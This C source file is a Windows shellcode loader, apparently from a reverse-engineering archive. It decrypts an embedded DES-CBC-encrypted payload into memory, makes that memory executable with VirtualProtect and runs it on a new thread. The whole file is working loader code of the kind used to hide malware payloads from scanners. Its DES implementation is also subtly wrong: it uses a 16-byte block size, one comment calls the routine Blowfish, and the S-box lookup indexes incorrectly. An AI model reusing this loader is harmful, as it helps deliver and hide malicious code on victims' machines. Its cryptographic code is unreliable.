/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory.
    implementing DES algorithm.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    DES algorithm
    - permission: VirtualProtect
    - execution:  CreateThread

Reference:
    - https://github.com/ReversingID/Crypto-Reference/blob/master/Codes/Cipher/Block/DES/code.c

Note:
    - key size: 128-bit
    - mode: CBC (Cipher Block Chaining)
    - IV is appended into the shellcode
*/

#include <windows.h>
#include <stdint.h>

/* ************************* CONFIGURATION & SEED ************************* */
#define BLOCKSIZE   128
#define BLOCKSIZEB  16
#define KEYSIZE     128
#define KEYSIZEB    16
#define ROUNDS      16

#if !defined(LITTLE_ENDIAN) && !defined(BIG_ENDIAN)
    #ifdef _MSC_VER
        #define LITTLE_ENDIAN
    #elif defined(__BYTE_ORDER__) && (__BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__)
        #define LITTLE_ENDIAN 
    #elif defined(__BYTE_ORDER__) && (__BYTE_ORDER__ == __ORDER_BIG_ENDIAN__)
        #define BIG_ENDIAN
    #else 
        #define BIG_ENDIAN
    #endif
#endif

// initial permutation table
const uint8_t IP_TABLE[] = {
    58, 50, 42, 34, 26, 18, 10,  2,
    60, 52, 44, 36, 28, 20, 12,  4,
    62, 54, 46, 38, 30, 22, 14,  6,
    64, 56, 48, 40, 32, 24, 16,  8,
    57, 49, 41, 33, 25, 17,  9,  1,
    59, 51, 43, 35, 27, 19, 11,  3,
    61, 53, 45, 37, 29, 21, 13,  5,
    63, 55, 47, 39, 31, 23, 15,  7
};

// inverse of initial permutation table
const uint8_t FP_TABLE[] = {
    40, 8, 48, 16, 56, 24, 64, 32,
    39, 7, 47, 15, 55, 23, 63, 31,
    38, 6, 46, 14, 54, 22, 62, 30,
    37, 5, 45, 13, 53, 21, 61, 29,
    36, 4, 44, 12, 52, 20, 60, 28,
    35, 3, 43, 11, 51, 19, 59, 27,
    34, 2, 42, 10, 50, 18, 58, 26,
    33, 1, 41,  9, 49, 17, 57, 25
};

// expansion table
const uint8_t E_TABLE[] = {
    32,  1,  2,  3,  4,  5,
     4,  5,  6,  7,  8,  9,
     8,  9, 10, 11, 12, 13,
    12, 13, 14, 15, 16, 17,
    16, 17, 18, 19, 20, 21,
    20, 21, 22, 23, 24, 25,
    24, 25, 26, 27, 28, 29,
    28, 29, 30, 31, 32,  1
};

// post S-Box permutation table
const uint8_t P_TABLE[] = {
    16,  7, 20, 21, 
    29, 12, 28, 17,
     1, 15, 23, 26, 
     5, 18, 31, 10,
     2,  8, 24, 14, 
    32, 27,  3,  9,
    19, 13, 30,  6, 
    22, 11,  4, 25
};

// S-Box (S1 - S8)
const uint8_t S_BOX[8][64] = {
    {
        14,  4, 13,  1,  2, 15, 11,  8,  3, 10,  6, 12,  5,  9,  0,  7,
         0, 15,  7,  4, 14,  2, 13,  1, 10,  6, 12, 11,  9,  5,  3,  8,
         4,  1, 14,  8, 13,  6,  2, 11, 15, 12,  9,  7,  3, 10,  5,  0,
        15, 12,  8,  2,  4,  9,  1,  7,  5, 11,  3, 14, 10,  0,  6, 13
    },
    {
        15,  1,  8, 14,  6, 11,  3,  4,  9,  7,  2, 13, 12,  0,  5, 10,
         3, 13,  4,  7, 15,  2,  8, 14, 12,  0,  1, 10,  6,  9, 11,  5,
         0, 14,  7, 11, 10,  4, 13,  1,  5,  8, 12,  6,  9,  3,  2, 15,
        13,  8, 10,  1,  3, 15,  4,  2, 11,  6,  7, 12,  0,  5, 14,  9
    },
    {
        10,  0,  9, 14,  6,  3, 15,  5,  1, 13, 12,  7, 11,  4,  2,  8,
        13,  7,  0,  9,  3,  4,  6, 10,  2,  8,  5, 14, 12, 11, 15,  1,
        13,  6,  4,  9,  8, 15,  3,  0, 11,  1,  2, 12,  5, 10, 14,  7,
         1, 10, 13,  0,  6,  9,  8,  7,  4, 15, 14,  3, 11,  5,  2, 12
    },
    {
         7, 13, 14,  3,  0,  6,  9, 10,  1,  2,  8,  5, 11, 12,  4, 15,
        13,  8, 11,  5,  6, 15,  0,  3,  4,  7,  2, 12,  1, 10, 14,  9,
        10,  6,  9,  0, 12, 11,  7, 13, 15,  1,  3, 14,  5,  2,  8,  4,
         3, 15,  0,  6, 10,  1, 13,  8,  9,  4,  5, 11, 12,  7,  2, 14
    },
    {
         2, 12,  4,  1,  7, 10, 11,  6,  8,  5,  3, 15, 13,  0, 14,  9,
        14, 11,  2, 12,  4,  7, 13,  1,  5,  0, 15, 10,  3,  9,  8,  6,
         4,  2,  1, 11, 10, 13,  7,  8, 15,  9, 12,  5,  6,  3,  0, 14,
        11,  8, 12,  7,  1, 14,  2, 13,  6, 15,  0,  9, 10,  4,  5,  3
    },
    {
        12,  1, 10, 15,  9,  2,  6,  8,  0, 13,  3,  4, 14,  7,  5, 11,
        10, 15,  4,  2,  7, 12,  9,  5,  6,  1, 13, 14,  0, 11,  3,  8,
         9, 14, 15,  5,  2,  8, 12,  3,  7,  0,  4, 10,  1, 13, 11,  6,
         4,  3,  2, 12,  9,  5, 15, 10, 11, 14,  1,  7,  6,  0,  8, 13
    },
    {
         4, 11,  2, 14, 15,  0,  8, 13,  3, 12,  9,  7,  5, 10,  6,  1,
        13,  0, 11,  7,  4,  9,  1, 10, 14,  3,  5, 12,  2, 15,  8,  6,
         1,  4, 11, 13, 12,  3,  7, 14, 10, 15,  6,  8,  0,  5,  9,  2,
         6, 11, 13,  8,  1,  4, 10,  7,  9,  5,  0, 15, 14,  2,  3, 12
    },
    {
        13,  2,  8,  4,  6, 15, 11,  1, 10,  9,  3, 14,  5,  0, 12,  7,
         1, 15, 13,  8, 10,  3,  7,  4, 12,  5,  6, 11,  0, 14,  9,  2,
         7, 11,  4,  1,  9, 12, 14,  2,  0,  6, 10, 13, 15,  3,  5,  8,
         2,  1, 14,  7,  4, 10,  8, 13, 15, 12,  9,  0,  3,  5,  6, 11
    }
};

// permutated choice 1 Table
const uint8_t PC1_TABLE[] = {
    57, 49, 41, 33, 25, 17,  9,
     1, 58, 50, 42, 34, 26, 18,
    10,  2, 59, 51, 43, 35, 27,
    19, 11,  3, 60, 52, 44, 36,
    
    63, 55, 47, 39, 31, 23, 15,
     7, 62, 54, 46, 38, 30, 22,
    14,  6, 61, 53, 45, 37, 29,
    21, 13,  5, 28, 20, 12,  4
};

// permutated choice 2 table
const uint8_t PC2_TABLE[] = {
    14, 17, 11, 24,  1,  5,
     3, 28, 15,  6, 21, 10,
    23, 19, 12,  4, 26,  8,
    16,  7, 27, 20, 13,  2,
    41, 52, 31, 37, 47, 55,
    30, 40, 51, 45, 33, 48,
    44, 49, 39, 56, 34, 53,
    46, 42, 50, 36, 29, 32
};

// key shift per round
const uint8_t SHIFT_TABLE[] = {
    1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1
};

typedef struct 
{
    uint64_t rkeys[16];
} des_t;


/* ********************* INTERNAL FUNCTIONS PROTOTYPE ********************* */
void block_decrypt (des_t * config, uint8_t * data);
void key_setup (des_t * config, uint8_t * key);

uint64_t permutate(uint64_t input, const uint8_t * table, size_t table_size);
uint64_t left_shift(uint64_t input, uint32_t shift, size_t size);
uint64_t feistel(uint64_t data, uint64_t round_key);


/* *************************** HELPER FUNCTIONS *************************** */
/* XOR 2 data block */
void xor_block(uint8_t * dst, uint8_t * src1, uint8_t * src2)
{
    register uint32_t i = 0;
    for (i = 0; i < BLOCKSIZEB; i++)
        dst[i] = src1[i] ^ src2[i];
}


// Blowfish decryption with CBC
void decrypt(uint8_t * data, uint32_t size, uint8_t * key, uint8_t * iv)
{
    des_t  config;
    uint32_t i;
    uint8_t  prev_block[BLOCKSIZEB];
    uint8_t  cipher_block[BLOCKSIZEB];

    // configure
    key_setup(&config, key);

    memcpy(prev_block, iv, BLOCKSIZEB);
    
    for (i = 0; i < size; i += BLOCKSIZEB)
    {
        // copy to temporary block
        memcpy(cipher_block, &data[i], BLOCKSIZEB);

        // decrypt the block
        block_decrypt(&config, &data[i]);

        // XOR the previous ciphertext with current ciphertext block
        xor_block(&data[i], &data[i], prev_block);

        // copy the current ciphertext as previous block
        memcpy(prev_block, cipher_block, BLOCKSIZEB); 
    }
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    // IV is embedded within, so we need to mark both payload and IV
    uint8_t     payload []  = { 
        0xcd, 0xaf, 0xce, 0xec, 0x49, 0x83, 0x13, 0x24, 0x26, 0x54, 0xa5, 0xa2, 0xb9, 0x04, 0x43, 0x96,
		0xae, 0x3f, 0xad, 0xbc, 0xe6, 0x23, 0x43, 0x78, 0xb6, 0xc4, 0x35, 0x32, 0x29, 0x94, 0xd3, 0x06,
		0x5e, 0xcf, 0x01, 0x1f, 0x16, 0xd3, 0xb3, 0x88, 0xb6, 0xc4, 0x35, 0x32, 0x29, 0x94, 0xd3, 0x06
    };
    uint32_t    payload_len = 32;
    uint8_t*    iv = &payload[payload_len];

    // secret-key
    uint8_t     key[] = 
            { 0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x49, 0x4E, 0x47, 0x2E, 0x49, 0x44, 
    /* ASCII:   R     E     V     E     R     S     I     N     G     .     I     D  */
              0x31, 0x33, 0x33, 0x37 };
            /*  1     3     3     7  */

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decrypt data
    RtlMoveMemory (runtime, payload, payload_len);
    decrypt ((uint8_t*)runtime, payload_len, key, iv);
    	
    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}

void block_decrypt(des_t * config, uint8_t data[BLOCKSIZEB])
{
    int32_t  i;
    uint64_t block = 0;
    uint64_t perm, L, R, nL, nR;
    uint64_t combined;
    uint64_t output;

#ifdef LITTLE_ENDIAN
    for (i = 0; i < 8; i++)
        block = (block << 8) | data[i];
#else 
    block = *(uint64_t*)data;
#endif 

    // actual encryption logic
    perm = permutate(block, IP_TABLE, sizeof(IP_TABLE));
    L = (perm >> 32) & 0xFFFFFFFF;
    R = perm & 0xFFFFFFFF;

    for (i = ROUNDS - 1; i >= 0; i--)
    {
        nR = L;
        nL = R ^ feistel(L, config->rkeys[i]);

        L = nL;
        R = nR;
    }

    combined = (R << 32) | L;
    output = permutate(combined, FP_TABLE, sizeof(FP_TABLE));

#ifdef LITTLE_ENDIAN
    for (i = 7; i >= 0; i--, output >>= 8)
        data[i] = output & 0xFF;
#else 
    *(uint64_t*)data = output;
#endif 
}

/*
    Key scheduling and setup the configuration
    Internally key will be casted as integer.
*/
void key_setup (des_t * config, uint8_t key[KEYSIZEB])
{
    uint64_t _key = 0, perm_key, C, D, combined;
    size_t   i, round;

#ifdef LITTLE_ENDIAN
    for (i = 0; i < 8; i++)
        _key = (_key << 8) | key[i];
#else 
    _key = *(uint64_t*)key;
#endif 

    perm_key = permutate(_key, PC1_TABLE, sizeof(PC1_TABLE));
    C = (perm_key >> 28) & (((uint64_t)1 << 28) - 1);
    D = perm_key & (((uint64_t)1 << 28) - 1);

    for (round = 0; round < ROUNDS; round++)
    {
        C = left_shift(C, SHIFT_TABLE[round], 28);
        D = left_shift(D, SHIFT_TABLE[round], 28);

        combined = (C << 28) | D;
        config->rkeys[round] = permutate(combined, PC2_TABLE, sizeof(PC2_TABLE));
    }
}

uint64_t 
permutate(uint64_t input, const uint8_t * table, size_t table_size)
{
    size_t   idx;
    uint64_t output = 0;

    for (idx = 0; idx < table_size; idx++)
    {
        if ((input >> (64 - table[idx])) & 1) {
            output |= ((uint64_t)1 << (table_size - 1 - idx));
        }
    }
    return output;
}

uint64_t left_shift(uint64_t input, uint32_t shift, size_t size)
{
    return ((input << shift) | (input >> (size - shift))) & (((uint64_t)1 << size) - 1);
}

uint64_t feistel(uint64_t data, uint64_t round_key)
{
    uint64_t expand = permutate(data, E_TABLE, sizeof(E_TABLE));
    uint64_t xor_res = expand ^ round_key;
    uint64_t sbox_res = 0;
    size_t   i;
    uint8_t  row, col, sbox_val;

    for (i = 0; i < 8; i++)
    {
        row = ((xor_res >> (42 - (i * 6))) & 0x2) | ((xor_res >> (47 - (i * 6))) & 0x1);
        col = (xor_res >> (43 - (i * 6))) & 0xF;
        sbox_val  = S_BOX[i][row * col];
        sbox_res |= (uint64_t)sbox_val << (28 - (i * 4));
    }
    return permutate(sbox_res, P_TABLE, sizeof(P_TABLE));
}